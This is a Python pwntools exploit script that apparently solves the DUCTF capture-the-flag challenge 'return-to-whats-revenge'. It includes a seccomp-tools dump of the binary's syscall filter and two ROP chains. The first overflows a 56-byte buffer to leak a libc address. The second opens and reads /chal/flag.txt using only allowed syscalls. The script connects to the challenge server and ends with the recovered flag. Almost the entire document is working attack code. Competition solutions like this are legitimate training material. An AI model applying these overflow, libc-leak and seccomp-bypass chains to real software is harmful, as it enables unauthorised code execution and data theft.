#!/usr/bin/env python
from pwn import *
import os

"""
$ seccomp-tools dump ./return-to-whats-revenge

0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
0002: 0x06 0x00 0x00 0x00000000  return KILL
0003: 0x20 0x00 0x00 0x00000000  A = sys_number
0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0024: 0x06 0x00 0x00 0x00000000  return KILL

"""
context.binary = elf = ELF('return-to-whats-revenge')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
context.log_level = "debug"
# p = process(elf.path, env = {"LD_PRELOAD": os.path.abspath('./libc6_2.27-3ubuntu1_amd64.so')})
# gdb.attach(p, 'init-gef\nbreak *0x00000000004011d9')
p = remote('chal.duc.tf', 30006)
padding = "A"*56

pop_rdi = 0x00000000004019db
pop_rsi_r15 = 0x00000000004019d9
ret = 0x0000000000401016
bss = elf.bss(0x30)

log.info("BSS: 0x{:x}".format(bss))

ropchain = flat(
	pop_rdi, elf.got['gets'],
	elf.plt['puts'],
	elf.symbols['vuln']
)


p.sendlineafter("to return to?\n", padding + ropchain)
# libc_base = u64(p.recvline(False).ljust(8, "\x00")) - 0x0800b0
libc_base = u64(p.recvline(False).ljust(8, "\x00")) - libc.symbols['gets']

open = libc_base + libc.symbols['open']
read = libc_base + libc.symbols['read']
syscall_ret = libc_base + libc.symbols['alarm'] + 5

log.info("Libc: 0x{:x}".format(libc_base))

ropchain = flat(
	pop_rdi, bss,
	elf.plt['gets'],
	pop_rdi, 0,
	pop_rsi_r15, bss+0x100, 0,
	read,
	pop_rdi, bss,
	pop_rsi_r15, 0x0, 0x0,
	syscall_ret,
	pop_rdi, 3,
	pop_rsi_r15, bss+0x20, 0,
	read,
	pop_rdi, bss+0x20,
	elf.symbols['puts']
)

p.sendlineafter("to return to?\n", padding + ropchain)

p.sendline("/chal/flag.txt\x00")

p.sendline("A")

p.interactive()
# DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
